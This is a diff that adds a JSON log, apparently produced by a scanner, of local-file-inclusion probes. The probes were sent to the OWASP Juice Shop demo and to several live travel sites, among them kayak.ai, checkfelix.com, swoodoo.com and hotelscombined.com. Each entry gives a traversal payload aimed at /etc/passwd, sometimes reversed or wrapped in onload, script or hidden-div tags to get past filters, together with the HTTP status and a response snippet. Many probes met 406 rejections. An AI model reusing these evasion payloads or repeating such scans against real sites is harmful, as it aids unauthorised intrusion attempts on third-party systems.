@@ -1,0 +1,289 @@
+[
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<body onload=dwssap/cte/../../..>",
+    "status": 200,
+    "payload": "<body onload=dwssap/cte/../../..>",
+    "type": "LFI",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=../../../etc/passwd",
+    "status": 200,
+    "payload": "../../../etc/passwd",
+    "type": "LFI",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<!--URGENT:../../../etc/passwd-->",
+    "status": 200,
+    "payload": "<!--URGENT:../../../etc/passwd-->",
+    "type": "LFI",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<div style='display:none'>dwssap/cte/../../..</div>",
+    "status": 200,
+    "payload": "<div style='display:none'>dwssap/cte/../../..</div>",
+    "type": "LFI",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<body onload=../../../etc/passwd>",
+    "status": 200,
+    "payload": "<body onload=../../../etc/passwd>",
+    "type": "LFI",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<script data-info='init'>dwssap/cte/../../..</script>",
+    "status": 200,
+    "payload": "<script data-info='init'>dwssap/cte/../../..</script>",
+    "type": "LFI",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=dwssap/cte/../../..",
+    "status": 200,
+    "payload": "dwssap/cte/../../..",
+    "type": "LFI",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<!--URGENT:dwssap/cte/../../..-->",
+    "status": 200,
+    "payload": "<!--URGENT:dwssap/cte/../../..-->",
+    "type": "LFI",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q={\"action\": \"sync\", \"data\": {\"token\": \"dwssap/cte/../../..\"}}",
+    "status": 200,
+    "payload": "{\"action\": \"sync\", \"data\": {\"token\": \"dwssap/cte/../../..\"}}",
+    "type": "LFI",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://kayak.ai?q=<textarea>dwssap/cte/../../..</textarea>",
+    "status": 200,
+    "payload": "<textarea>dwssap/cte/../../..</textarea>",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='ja-jp' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 05:25:07 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://kayak.ai?q=../../../etc/passwd",
+    "status": 406,
+    "payload": "../../../etc/passwd",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<div style='display:none'><!--../../../etc/passwd--></div>",
+    "status": 406,
+    "payload": "<div style='display:none'><!--../../../etc/passwd--></div>",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<!--URGENT:../../../etc/passwd-->",
+    "status": 406,
+    "payload": "<!--URGENT:../../../etc/passwd-->",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=../../../etc/passwd",
+    "status": 406,
+    "payload": "../../../etc/passwd",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=setTimeout(()=>../../../etc/passwd,1000)",
+    "status": 406,
+    "payload": "setTimeout(()=>../../../etc/passwd,1000)",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<div style='display:none'>setTimeout(()=>../../../etc/passwd,1000)</div>",
+    "status": 406,
+    "payload": "<div style='display:none'>setTimeout(()=>../../../etc/passwd,1000)</div>",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<body onload=../../../etc/passwd>",
+    "status": 406,
+    "payload": "<body onload=../../../etc/passwd>",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<form action='/submit'><input name='note' value='setTimeout(()=>../../../etc/passwd,1000)'></form>",
+    "status": 406,
+    "payload": "<form action='/submit'><input name='note' value='setTimeout(()=>../../../etc/passwd,1000)'></form>",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<form action='/submit'><input name='note' value='../../../etc/passwd'></form>",
+    "status": 406,
+    "payload": "<form action='/submit'><input name='note' value='../../../etc/passwd'></form>",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<noscript><template>dwssap/cte/../../..</template></noscript>",
+    "status": 406,
+    "payload": "<noscript><template>dwssap/cte/../../..</template></noscript>",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<!--URGENT:<template>dwssap/cte/../../..</template>-->",
+    "status": 200,
+    "payload": "<!--URGENT:<template>dwssap/cte/../../..</template>-->",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-at' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:09:05 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<template>dwssap/cte/../../..</template>",
+    "status": 200,
+    "payload": "<template>dwssap/cte/../../..</template>",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-at' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:12:49 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<textarea>dwssap/cte/../../..</textarea>",
+    "status": 200,
+    "payload": "<textarea>dwssap/cte/../../..</textarea>",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-at' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:17:30 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.checkfelix.com?q=dwssap/cte/../../..",
+    "status": 200,
+    "payload": "dwssap/cte/../../..",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-at' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:20:10 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.checkfelix.com?q={\"action\": \"sync\", \"data\": {\"token\": \"dwssap/cte/../../..\"}}",
+    "status": 200,
+    "payload": "{\"action\": \"sync\", \"data\": {\"token\": \"dwssap/cte/../../..\"}}",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-at' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:20:39 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.swoodoo.com?q=../../../etc/passwd",
+    "status": 406,
+    "payload": "../../../etc/passwd",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<body onload=../../../etc/passwd>",
+    "status": 406,
+    "payload": "<body onload=../../../etc/passwd>",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<textarea>setTimeout(()=>dwssap/cte/../../..,1000)</textarea>",
+    "status": 200,
+    "payload": "<textarea>setTimeout(()=>dwssap/cte/../../..,1000)</textarea>",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-de' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:35:45 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<div style='display:none'>dwssap/cte/../../..</div>",
+    "status": 200,
+    "payload": "<div style='display:none'>dwssap/cte/../../..</div>",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-de' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:37:06 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<script data-info='init'>dwssap/cte/../../..</script>",
+    "status": 406,
+    "payload": "<script data-info='init'>dwssap/cte/../../..</script>",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.swoodoo.com?q=setTimeout(()=>dwssap/cte/../../..,1000)",
+    "status": 200,
+    "payload": "setTimeout(()=>dwssap/cte/../../..,1000)",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-de' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:49:24 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.swoodoo.com?q=dwssap/cte/../../..",
+    "status": 200,
+    "payload": "dwssap/cte/../../..",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-de' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:53:20 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<form action='/submit'><input name='note' value='setTimeout(()=>dwssap/cte/../../..,1000)'></form>",
+    "status": 200,
+    "payload": "<form action='/submit'><input name='note' value='setTimeout(()=>dwssap/cte/../../..,1000)'></form>",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-de' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:54:07 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<!--URGENT:../../../etc/passwd-->",
+    "status": 406,
+    "payload": "<!--URGENT:../../../etc/passwd-->",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=<!--URGENT:dwssap/cte/../../..-->",
+    "status": 200,
+    "payload": "<!--URGENT:dwssap/cte/../../..-->",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 08:00:37 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=<script data-info='init'><svg onload=dwssap/cte/../../..></script>",
+    "status": 406,
+    "payload": "<script data-info='init'><svg onload=dwssap/cte/../../..></script>",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=<textarea>dwssap/cte/../../..</textarea>",
+    "status": 200,
+    "payload": "<textarea>dwssap/cte/../../..</textarea>",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 08:25:32 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=<div style='display:none'><svg onload=dwssap/cte/../../..></div>",
+    "status": 406,
+    "payload": "<div style='display:none'><svg onload=dwssap/cte/../../..></div>",
+    "type": "LFI",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=dwssap/cte/../../..",
+    "status": 200,
+    "payload": "dwssap/cte/../../..",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 08:31:27 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.hotelscombined.com?q={\"action\": \"sync\", \"data\": {\"token\": \"dwssap/cte/../../..\"}}",
+    "status": 200,
+    "payload": "{\"action\": \"sync\", \"data\": {\"token\": \"dwssap/cte/../../..\"}}",
+    "type": "LFI",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 08:32:07 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=<svg onload=dwssap/cte/../../..>",
+    "status": 406,
+    "payload": "<svg onload=dwssap/cte/../../..>",
+    "type": "LFI",
+    "snippet": ""
+  }
+]
